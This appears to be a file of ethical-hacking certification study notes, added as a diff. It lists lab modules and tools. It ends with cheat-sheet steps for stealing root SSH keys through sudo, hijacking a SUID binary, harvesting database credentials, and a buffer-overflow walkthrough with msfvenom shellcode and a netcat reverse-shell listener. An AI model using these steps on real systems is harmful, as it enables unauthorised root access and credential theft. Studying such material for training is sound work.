@@ -1,0 +1,472 @@
+02 - Footprinting and Reconnaissance
+- Perform footprinting through Search Engines
+Gather information using Advanced Google Hacking Techniques
+Gather information from Video Search Engines
+Gather information from FTP Search Engines
+Gather information from IoT Search Engines
+- Perform footprinting through Web Services
+Find the company's domains and sub-domains using Netcraft
+Gather personal information using PeekYou online people search service
+Gather an email list using theHarvester
+Gather information using Deep and Dark Web searching
+Determine target OS through passive footprinting (Sherlock)
+- Perform footprinting through social networking sites
+Gather employee's information from LinkedIn using theHarvester
+Gather personal information from various social networking sites using Sherlock
+// Gather information using Followerwonk
+- Perform website footprinting
+Gather information about a target website using ping command line utility
+Gather information about a target website using Photon
+Gather information about a target website using Central Ops
+Extract a company's data using web data extractor
+Mirror a target website using HTTrack web site copier
+Gather information about a target website using GRecon
+Gather a wordlist from the target website using CeWL
+- Perform email footprinting
+Gather information about a target by tracing emails using eMailTrackerPro
+- Perform whois footprinting
+Perform whois lookup using DomainTools (whois domaintools)
+- Perform DNS footprinting
+Gather DNS information using nslookup command line utility and online tool (kloth)
+Perform reverse DNS lookiup using Reverse IP Domain Check (you get signal) and DNSRecon
+Gather information of subdomain and DNS records using SecurityTrails
+- Perform network footprinting
+Locate the network range (ARIN)
+Perform network tracerouting in Windows and Linux machines
+Perform advanced network route tracing using Path Analyzer Pro
+- Perform footprinting using various footprinting tools
+Footprinting a target using Recon-ng
+Footprinting a target using Maltego
+Footprinting a target using OSRFramework
+Footprinting a target using FOCA
+Footprinting a target using BillCipher
+Footprinting a target using OSINT Framework
+
+03 - Scanning Networks
+- Perform host discovery
+Perform host discovery using Nmap
+Perform host discovery using Angry IP Scanner
+- Perform port and service discovery
+Perform port and service discovery using MegaPing
+Perform port and service discovery using NetScanTools Pro
+Perform port scanning using sx tool
+Explore various network scanning techniques using Nmap
+Explore various network scanning techniques using Hping3
+- Perform OS discovery
+Identify the target system's OS with time-to-live (TTL) and TCP window sizes using Wireshark
+Perform OS discovery using Nmap Script Engine (NSE)
+Perform OS discovery using Unicornscan
+- Scan beyond IDS and firewall
+Scan beyond IDS/Firewall using various evasion techniques
+Create custom packets using Colasoft Packet Builder to scan beyond IDS/Firewall
+Create custom UDP and TCP packets using Hping3 to scan beyond IDS/Firewall
+Browse anonymously using Proxy Switcher
+Browse anonymously using CyberGhost VPN
+- Perform network scanning using various scanning tools
+Scan a target network using Metasploit
+
+04 - Enumeration
+- Perform NetBIOS enumeration
+Perform NetBIOS enumeration using windows command-line utilities
+Perform NetBIOS enumeration using NetBIOS enumerator
+Perform NetBIOS enumeration using an NSE Script
+- Perform SNMP enumeration
+Perform SNMP enumeration using snmp-check
+Perform SNMP enumeration using SoftPerfect network scanner
+Perform SNMP enumeration using SnmpWalk
+Perform SNMP enumeration using Nmap
+- Perform LDAP enumeration
+Perform LDAP enumeration using active directory explorer (AD Explorer)
+Perform LDAP enumeration using Python and Nmap
+Perform LDAP enumeration using ldapsearch
+- Perform NFS enumeration
+Perform NFS enumeration using RPCScan and SuperEnum
+- Perform DNS enumeration
+Perform DNS enumeration using Zone Transfer
+Perform DNS enumeration using DNSSEC Zone Walking
+Perform DNS enumeration using Nmap
+- Perform SMTP enumeration
+Perform SMTP enumeration using Nmap
+- Perform RPC, SMB, and FTP enumeration
+Perform SMB and RPC enumeration using NetScanTools Pro
+Perform RPC, SMB, and FTP enumeration using Nmap
+- Perform enumeration using various enumeration tools
+Enumerate information using Global Network Inventory
+Enumerate network resources using Advanced IP Scanner
+Enumerate information from Windows and Samba Host using Enum4linux
+
+05 - Vulnerability Analysis
+- Perform vulnerability research with vulnerability scoring systems and databases
+Perform vulnerability search in Common Weakness Enumeration (CWE)
+Perform vulnerability research in Common Vulnerabilities and Exposures (CVE)
+Perform vulnerability research in National Vulnerability Database (NVD)
+- Perform vulnerability assessment using various vulnerability assessment tools
+Perform vulnerability analysis using OpenVAS
+Perform vulnerability scanning using Nessus
+Perform vulnerability scanning using GFI LanGuard
+Perform web servers and applications vulnerability scanning using CGI scanner Nikto
+
+06 - System Hacking
+- Gain Access to the System
+Perform active online attack to crack the system's password using Responder
+Audit system passwords using L0phtCrack
+Find vulnerabilities on exploit sites
+Exploit client-side vulnerabilities and establish a VNC session
+Gain access to a remote system using Armitage
+Gain access to a remote system using Ninja Jonin
+Perform buffer overflow attack and gain access to a remote system
+- Perform privilege escalation to gain higher privileges
+Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
+Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
+Escalate privileges by exploiting vulnerability in pkexec
+Escalate privileges in Linux machine by exploiting misconfigured NFS
+Escalate privileges by bypassing UAC and exploiting Sticky Keys
+Escalate privileges to gather hashdump using Mimikatz
+- Maintain remote access and hide malicious activities
+User system monitoring and surveillance using Power Spy
+User system monitoring and surveillance using Spytech SpyAgent
+Hide files using NTFS Streams
+Hide data using White Space Steganography
+Image Steganography using OpenStego and StegOnline
+Maintain persistence by abusing Boot or Login autostart execution
+Maintain domain persistence by exploiting Active Directory Objects
+Privilege Escalation and maintain persistence using WMI
+Covert channels using Covert_TCP
+- Clear logs to hide the evidence of compromise
+View, enable, and clear audit policies using auditpol
+Clear Windows machine logs using various utilities
+Clear Linux machine logs using the BASH shell
+Hiding artifacts in Windows and Linux machines
+Clear Windows machine logs using CCleaner
+
+07 - Malware Threats
+- Gain access to the target system using trojans
+Gain control over a victim machine using the njRAT rat trojan
+Hide a trojan using SwayzCryptor and make it undetectable to various anti-virus programs
+Create a trojan server using Theef rat trojan
+- Infect the target system using a virus
+Create a virus using the JPS virus maker tool and infect the target system
+- Perform static malware analysis
+Perform malware scanning using Hybrid Analysis
+Perform a string search using BinText
+Identify packaging and obfuscation methods using PEid
+Analyze ELF executable file using Detect It Easy (DIE)
+Find the portable executable (PE) information of a malware executable file using PE Explorer
+Identify file dependencies using Dependency Walker
+Perform malware disassembly using IDA and OllyDbg
+Perform malware disassembly using Ghidra
+- Perform dynamic malware analysis
+Perform port monitoring using TCPView and CurrPorts
+Perform process monitoring using process monitor
+Perform registry monitoring using Reg Organizer
+Perform Windows services monitoring using Windows Service Manager (SrvMan)
+Perform startup programs monitoring using autoruns for Windows and WinPatrol
+Perform installation monitoring using Mirekusoft install monitor
+Perform files and folder monitoring using PA File Sight
+Perform device drivers monitoring using DriverView and Driver Reviver
+Perform DNS monitoring using DNSQuerySniffer
+
+08 - Sniffing
+- Perform active sniffing
+Perform MAC flooding using macof
+Perform a DHCP starvation attack using Yersinia
+Perform ARP poisoning using arpspoof
+Perform a man-in-the-middle (MITM) attack using Cain & Abel
+Spoof a MAC address using TMAC and SMAC
+Spoof a MAC address of Linux machine using macchanger
+- Perform network sniffing using various sniffing tools
+Perform password sniffing using Wireshark
+Analyze a network using the Omnipeek network protocol analyzer
+Analyze a network using the SteelCentral Packet Analyzer
+- Detect network sniffing
+Detect ARP poisoning and promiscuous mode in a switch-based network
+Detect ARP poisoning using the Capsa Network Analyzer
+
+09 - Social Engineering
+- Perform social engineering using various techniques
+Sniff credentials using the Social-Engineer Toolkit (SET)
+- Detect a phishing attack
+Detect phishing using Netcraft
+Detect phishing using PhishTank
+- Audit an organization's security for phishing attacks
+Audit an organization's security for phishing attacks using OhPhish
+
+10 - Denial-of-Service
+- Perform DoS and DDoS attacks using various techniques
+Perform a DoS attack (SYN flooding) on a target host using Metasploit
+Perform a DoS attack on a target host using hping3
+Perform a DoS attack using Raven-storm
+Perform a DDos attack using HIOC
+Perform a DDoS attack using LOIC
+- Detect and protect against DoS and DDoS attacks
+Detect and protect against DDoS attacks using Anti DDoS Guardian
+
+11 - Session Hijacking
+- Perform session hijacking
+Hijack a session using Zed Attack Proxy (ZAP)
+Intercept HTTP traffic using bettercap
+Intercept HTTP traffic using Hetty
+- Detect session hijacking
+Detect session hijacking using Wireshark
+
+12 - Evading IDS, Firewalls, and Honeypots
+- Perform intrusion detection using various tools
+Detect intrusions using Snort
+Detect malicious network traffic using ZoneAlarm free firewall
+Detect malicious network traffic using HoneyBOT
+- Evade firewalls using various evasion techniques
+Bypass windows firewall using Nmap evasion techniques
+Bypass firewall rules using HTTP/FTP tunneling
+Bypass antivirus using Metasploit templates
+Bypass firewall through Windows BITSAdmin
+
+13 - Hacking Web Servers
+- Footprint the web server
+Information gather using Ghost Eye
+Perform web server reconnaissance using Skipfish
+Footprint a web server using the httprecon tool
+Footprint a web server using ID Serve
+Footprint a web server using Netcat and Telnet
+Enumerate web server information using Nmap Scripting Engine (NSE)
+Uniscan web server fingerprinting in Parrot Security
+- Perform a web server attack
+Crack FTP credentials using a directory attack
+
+14 - Hacking Web Applications
+- Footprint the web infrastructure
+Perform web application reconnaissance using Nmap and Telnet
+Perform web application reconnaisance using WhatWeb
+Perform web spidering using OWASP ZAP
+Detect load balancers using various tools
+Identify web server directories using various tools
+Perform web application vulnerability scanning using Vega
+Identify Clickjacking vulnerability using ClickjackPoc
+- Perform web application attacks
+Perform a brute-force attack using Burp Suite
+perform parameter tampering using Burp Suite
+Identify XSS vulnerabilities in web applications using PwnXSS
+Exploit parameter tampering and XSS vulnerabilities in web applications
+Perform Cross-Site Request Forgery (CSRF) attack
+Enumerate and hack a web application using WPScan and Metasploit
+Exploit a remote command execution vulnerability to compromise a target web server
+Exploit a file upload vulnerability at different security levels
+Gain access by exploiting Log4j vulnerability
+- Detect web application vulnerabilities using various web application security tools
+Detect web application vulnerabilities using N-Stalker web application security scanner
+
+15 - SQL Injection
+- Perform SQL injection attacks
+Perform an SQL injection attack on an MSSQL database
+Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+- Detect SQL injection vulnerabilities using various SQL injection detection tools
+Detect SQL injection vulnerabilities using DSSS
+Detect SQL injection vulnerabilities using OWASP ZAP
+
+16 - Hacking Wireless Networks
+- Footprint a wireless network
+Find a wi-fi networks in range using NetSurveyor
+- Perform wireless traffic analysis
+Find wi-fi networks and sniff wi-fi packets using Wash and Wireshark
+- Perform wireless attacks
+Find hidden SSIDs using Aircrack-ng
+Crack a WEP network using Wifiphisher
+Crack a WEP network using Aircrack-ng
+Crack a WPA network using Fern Wifi Cracker
+Crack a WPA2 network using Aircrack-ng
+Create a rogue access point to capture data packets
+
+17 - Hacking Mobile Platforms
+- Hack android devices
+Hack an android device by creating binary payloads using Parrot Security
+Harvest users' credentials using the Social-Engineer Toolkit
+Launching a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform
+Exploit the Android platform through ADB using PhoneSploit
+Hack an Android Device by creating APK file using AndroRAT
+- Secure Android devices using various Android security tools
+Analyze a malicious app using online Android analyzers
+Secure Android devices from malicious app using Malwarebytes security
+
+18 - IoT and OT Hacking
+- Perform footprinting using various footprinting techniques
+Gather information using online footprinting tools
+- Capture and analyze IoT device traffic
+Capture and analyze IoT traffic using Wireshark
+
+19 - Cloud Computing
+- Perform S3 bucket enumeration using various S3 bucket enumeration tools
+Enumerate S3 buckets using lazys3
+Enumerate S3 buckets using S3Scanner
+Enumerate S3 buckets using Firefox extension
+- Exploit s3 buckets
+Exploit open s3 buckets using AWS CLI
+- Perform privilege escalation to gain higher privileges
+Escalate IAM user privileges by exploiting misconfigured user policy
+
+20 - Cryptography
+- Encrypt the information using various cryptography tools
+Calculate one-way hashes using hashcalc
+Calculate MD5 hashes using MD5 calculator
+Calculate MD5 hashes using HashMyFiles
+Perform file and text message encryption using CryptoForge
+Perform file encryption using advanced encryption package
+Encrypt and decrypt data using BCTextEncoder
+- Create a self-signed certificate
+Create and use self-signed certificates
+- Perform email encryption
+Perform email encryption using Rmail
+- Perform disk encryption
+Perform disk encryption using VeraCrypt
+Perform disk encryption using BitLocker Drive Encryption
+Perform disk encryption using Rohos Disk Encryption
+- Perform cryptanalysis using various cryptanalysis tools
+Perform cryptanalysis using CrypTool
+Perform Cryptanalysis using AlphaPeeler
+
+
+
+Get site, ip, dns (((Recon-ng, theHarvester, sherlock))) - bonus: geo, PII, os
+Get open ports (((msfconsole, sx, hping3))) - bonus: os, netbios, snmp, ldap, nfs, dns, smtp, rpc, smb, ftp
+Get vulnerabilities (((Nikto, OWASP ZAP)))
+Hide/unhide items (((snow)))
+Login with passwords (((Responder, L0phtCrack, John-the-ripper)))
+Get access, escalate priv, maintain access (((msfconsole & tools, covert_tcp)))
+Page 595-604; 677-701; 702-718; 737-748; 749-760; 827-838; 841-855; 856-867;
+Clear logs (((auditpol, .batFile, wevtutil, cipher, export, history, shred)))
+Page 912 max
+
+
+
+
+
+
+
+
+
+
+
+Scan
+- Nmap
+
+Enum - FSSRN
+- FTP 21 -> Hydra
+- SNMP 161 -> snmp-check/nse snmp-process/msfconsole snmp_login/nse snmp-interface
+- SMB 445 -> S/U/G/O/S enum shares/enum users (script-args smbusername,smbpassword)/enum group/os/enum services
+- RDP 3389 (or 3333) -> rdp_scanner/Hydra/xfreerdp
+- NetBIOS 137-139 -> nse nbtstat/
+
+Traffic sniffing
+- Wireshark
+
+Steganography
+- snow
+- OpenStego
+- Covert TCP
+
+Cryptography
+- HashMyFiles
+- CrypTool
+- BCTextEncoder
+- CryptoForge
+- VeraCrypt
+
+Web & Android Hacking
+- sqlmap
+- WPScan
+- adb -> connect <ip>:<port>/devices/shell
+- burpsuite
+
+Priv escalation
+- 1. sudo -l
+ 2. sudo -u <user> /bin/bash
+ 3. cd root/.ssh
+ 4.1.1. cat id_rsa & download id_rsa & chmod 600 id_rsa
+ 4.1.2. ssh root@<ip> -p <port> -i id_rsa
+
+ 4.2.1. ssh-keygen -f key
+ 4.2.2. copy your pub key in machine's /root
+ 4.2.3. ssh root@<ip> -p <port> -i <YOUR private id_rsa>
+
+===========
+stat -c aAUGF
+greetings, welcome
+
+greetings only has read and execute
+welcome has root
+
+i use strings welcome and notice greetings is inside
+i am a user and i remove greetings.
+i now use cp /bin/bash greetings
+i use ./welcome
+i now have root
+===========
+
+cd /var/www/html/
+grep -nr "db_user"
+cat file and see credentials
+su and insert credentials
+
+rebootuser/linEnum
+peas-ng
+
+RAT tools
+- njRAT
+- MoSucker
+- ProRat
+- Theef
+- HTTP RAT
+
+- Nessus
+- Aircrack-ng
+- Malware analysis
+
+
+
+
+
+
+
+
+
+========= buffer
+
+nc 10.10.1.11 9999 -nv
+HELP
+
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+
+generic_tcp_send 10.10.1.11 9999 stats.spk 0 0
+
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+
+generic_tcp_send 10.10.1.11 9999 trun.spk 0 0
+
+/ceh/fuzz.py
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (take bytes from fuzz.py, increase by 100)
+/ceh/findoff.py (edit, take result from pattern_create.rb, run)
+copy EIP from imm.debug
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l (prev. bytes) -q (copied EIP)
+/ceh/overwrite.py (see if we can control EIP - EIP changes in imm.debug)
+Get bad chars from google search e.g. "\x00"
+/ceh/badchars.py
+
+Follow ESP dump, notice no bad chars in left window
+Copy mona from /ceh to imm.debug/pytools
+!mona modules
+no protection for essfunc.dll
+
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+JMP ESP (copy result e.g. FFE4)
+
+!mona find -s "\xff\xe4" -m essfunc.dll (copy result e.g. 0x625011af)
+go to address in disassembler icon > find result (625011af) > insert breakpoint with F2
+
+/ceh/jump.py .. from here no longer needing vulnserv
+msfvenom -p -a -f -b lhost lport exitfunc (copy result)
+/ceh/shellcode.py (edit and paste result in overflow)
+
+new window > nc -nvlp 4444
+old window > /ceh/shellcode.py
